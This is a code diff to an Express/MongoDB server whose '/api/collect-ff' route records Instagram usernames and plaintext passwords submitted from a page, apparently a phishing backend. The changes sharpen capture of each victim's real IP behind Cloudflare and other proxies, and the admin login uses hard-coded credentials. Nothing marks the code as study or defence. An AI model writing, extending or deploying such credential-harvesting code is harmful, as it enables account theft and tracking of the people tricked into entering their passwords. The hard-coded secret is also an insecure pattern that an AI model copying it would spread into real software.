@@ -6,6 +6,9 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Trust proxy to get real IP behind hosting proxies (Render/Cloudflare etc.)
+app.set('trust proxy', true);
+
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(cors());
@@ -34,7 +37,7 @@ const FFLogSchema = new mongoose.Schema({
 
 const FFLogModel = mongoose.model('FFLog', FFLogSchema);
 
-// Serve index.html on root route
+// Serve files
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -43,7 +46,7 @@ app.get('/viewer.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'viewer.html'));
 });
 
-// Admin Login Authentication Route
+// Admin Login Route
 app.post('/api/admin-login', (req, res) => {
     const { username, password } = req.body;
     if (username === "sumit@1123" && password === "sumit1123") {
@@ -53,15 +56,20 @@ app.post('/api/admin-login', (req, res) => {
     }
 });
 
-// Data Collect API Route matching index.html fetch call
+// Data Collect API Route with Detailed Device & IP Extraction
 app.post('/api/collect-ff', async (req, res) => {
     try {
         const recordId = 'INSTA_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
-        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         
+        // Accurate IP detection
+        const clientIp = req.headers['cf-connecting-ip'] || 
+                         req.headers['x-forwarded-for']?.split(',')[0].trim() || 
+                         req.socket.remoteAddress || 
+                         'Unknown IP';
+
         const newFFLog = new FFLogModel({
             id: recordId,
-            ip: clientIp,
+            ip: clientIp.replace('::ffff:', ''), // Clean up IPv6 prefix if present
             platform: req.body.platform || 'Instagram',
             instagram_username: req.body.instagram_username || 'N/A',
             instagram_password: req.body.instagram_password || 'N/A',
